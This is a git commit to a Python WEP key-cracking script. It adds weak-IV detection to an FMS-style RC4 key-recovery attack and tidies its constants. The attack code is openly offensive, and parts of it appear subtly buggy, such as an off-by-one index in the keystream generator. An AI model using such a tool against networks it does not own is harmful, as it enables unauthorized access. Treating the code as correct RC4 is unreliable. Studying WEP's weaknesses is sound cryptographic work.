806e39649cd0bdf86403d770b16df1680fbeb600
Shane Harvey <shane6harvey@yahoo.com>
2014-06-09 01:22:30 -0400

    Added weak iv filter method

--- wepcracker.py
+++ wepcracker.py
@@ -1,6 +1,7 @@
 
 __author__ = 'shane'
 
+N = 256
 
 def ksa(k):
     """
@@ -17,10 +18,10 @@ def ksa(k):
     :param k: the byte array key (IV prepended to the secret key)
     :return: a pseudo random permutation of [0, 1, 2,..., 255]
     """
-    s = [i for i in range(256)]
+    s = [i for i in range(N)]
     j = 0
-    for i in range(length):
-        j = (j + s[i] + k[i % len(k)]) % 256
+    for i in range(N):
+        j = (j + s[i] + k[i % len(k)]) % N
         # Swap(s[i], s[j])
         temp = s[i]
         s[i] = s[j]
@@ -49,13 +50,13 @@ def prga(s, datalength):
     i = 0
     j = 0
     for x in range(datalength):
-        i = (i+1) % 256
-        j = (j + s[i+1]) % 256
+        i = (i+1) % N
+        j = (j + s[i+1]) % N
         # Swap(s[i], s[j])
         temp = s[i]
         s[i] = s[j]
         s[j] = temp
-        z.append(s[(s[i] + s[j]) % 256])
+        z.append(s[(s[i] + s[j]) % N])
     return z
 
 
@@ -70,10 +71,10 @@ def simulate_resolved(b, iv, encr_byte, sk):
     """
     k = iv + sk
     # Perform b + 3 iterations of KSA
-    s = [i for i in range(256)]
+    s = [i for i in range(N)]
     j = 0
     for i in range(b + 3):
-        j = (j + s[i] + k[i % len(k)]) % 256
+        j = (j + s[i] + k[i % len(k)]) % N
         # Swap(s[i], s[j])
         temp = s[i]
         s[i] = s[j]
@@ -86,7 +87,36 @@ def simulate_resolved(b, iv, encr_byte, sk):
     if key_byte > 0:
         return key_byte
     else:
-        return key_byte + 256
+        return key_byte + N
+
+
+def weak_iv(iv, sk_len):
+    """
+    H1kari's method of weak IV detection from:
+    http://www.dartmouth.edu/~madory/RC4/wepexp.txt
+
+    :param iv: the iv in question
+    :param sk_len: the length of the secret key (5 or 13)
+    :return: true if iv is weak
+    """
+    x = iv[0]
+    y = iv[1]
+    z = iv[2]
+    a = x + y
+    b = (x + y) - z
+    l = sk_len
+    i = 0
+    for B in range(l):
+        if ((((0 <= a < B) or
+        (a == B and b == (B + 1) * 2)) and
+        (a != (B + 1) / 2 if B % 2 else 1)) or
+        (a == B + 1 and (b == (B + 1) * 2 if B == 0 else 1)) or
+        (x == B + 3 and y == N - 1) or
+        (((x == 1 and y == (B / 2) + 1) or
+        (x == (B / 2) + 2 and y == (N - 1) - x)) if (B != 0 and not (B % 2)) else 0)):
+            return True
+    return False
+
 
 def crackWEPkey(keysize, packets):
     """
@@ -99,7 +129,7 @@ def crackWEPkey(keysize, packets):
         counts = [0] * 256
         for p in packets[keybyte+3]:
             # construct key counts
-            count[simulate_resolved(keybyte, p[0], p[1], key)] += 1
+            counts[simulate_resolved(keybyte, p[0], p[1], key)] += 1
         # key[keybyte] = index of max(counts)
         key[keybyte] = max(enumerate(counts), key=lambda x: x[1])[0]
     return key
